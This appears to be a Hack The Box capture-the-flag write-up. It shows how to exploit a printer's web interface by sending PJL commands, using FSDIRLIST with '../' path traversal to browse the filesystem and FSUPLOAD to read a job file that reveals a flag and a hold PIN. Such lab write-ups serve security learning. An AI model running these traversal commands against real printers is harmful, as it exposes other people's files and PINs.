> My uncle isn't allowing me to print documents. He's off to vacation and I need a PIN to unlock this printer. All I found is a web server where this printer is managed from. Can you help me with this situation ?
#### Steps
1. Start by navigating to the webpage by pasting the ip:port into browser
2. The only tab that brough up a new page was `Job Controls`, which brough up the path `/jobs`
3. Sumbitting text brought up the path `/printer`
4. This is evident when inspecting the html code
```html
<form action="printer" method="post">
      <input type="text" placeholder="@PJL INFO ID" name="pjl">
      <input type="submit" value="Send">
</form>
```
5. Submitting `@PJL INFO ID` returns `HTB Printer`
6. PJL stands for HP Printer Job Language, so I looked for more PJL commands from HP which brought me to this [document](https://developers.hp.com/system/files/PJL_Technical_Reference_Manual.pdf)
7. I also found a reference for hacking printers [here](http://hacking-printers.net/wiki/index.php/Credential_disclosure), but that was not needed for this challenge
8. The main command I used was `FSDIRLIST` to view and traverse the filesystem
```shell
# view current directory
@PJL FSDIRLIST NAME="0:" ENTRY=1

# view parent directory
@PJL FSDIRLIST NAME="0:/../" ENTRY=1
```
9. Once in the parent directory, I saw a home folder listed
```shell
# navigating to home folder
@PJL FSDIRLIST NAME="0:/../home/" ENTRY=1
```
10. The `home` folder contained a folder called `default`, which contained a file `readysize`
11. To see file contents, we use `FSUPLOAD`
```shell
# command
@PJL FSUPLOAD NAME="0:/../home/default/readyjob"

# contents
@PJL FSUPLOAD FORMAT:BINARY NAME="0:/../home/default/readyjob" OFFSET=0 SIZE=457
%-12345X@PJL @PJL COMMENT FLAG = "HTB{w4lk_4nd_XXXXXX}" @PJL JOB NAME = "JetDirectBoot Job" @PJL SET
USERNAME="default" @PJL SET HOLDKEY="8214" @PJL SET ORIENTATION = PORTAIT @PJL SET QTY = 1 @PJL SET DUPLEX = ON @PJL SET RESOLUTION = 600 @PJL SET OUTBIN = LOWER
@PJL COMMENT START PCL JOB @PJL ENTER LANGUAGE = PCL %-12345X@PJL @PJL EOJ %-12345X
```
